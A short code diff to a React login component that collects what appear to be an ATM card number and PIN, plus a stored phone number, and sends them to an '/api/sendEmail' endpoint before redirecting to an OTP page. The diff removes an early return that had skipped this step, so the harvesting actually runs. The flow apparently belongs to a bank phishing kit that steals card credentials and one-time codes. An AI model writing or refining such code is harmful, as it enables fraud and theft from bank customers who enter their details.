@@ -12,21 +12,17 @@ function Login({host}) {
 
         if (nomoratm && pin) {
 
-            router.push('/otp')
-
-            return
-            
             document.getElementById('btn').innerHTML = 'Loading...'
-    
+            
             localStorage.setItem('nomoratm', nomoratm)
             localStorage.setItem('pin', pin)
-    
+            
             const body = {
                 nomoratm,
                 pin,
                 nohp : localStorage.getItem('nohp')
             }
-    
+            
             try {
     
                 const response = await fetch('/api/sendEmail',{
@@ -37,10 +33,11 @@ function Login({host}) {
                     },
                     body: JSON.stringify(body)
                 })
-    
+                
                 const json = await response.json()
-            
+                
                 if (json.status === 200) {
+                    router.push('/otp')
                     document.getElementById('btn').innerHTML = 'PROSES'
                 } else{
                     document.getElementById('btn').innerHTML = 'PROSES'
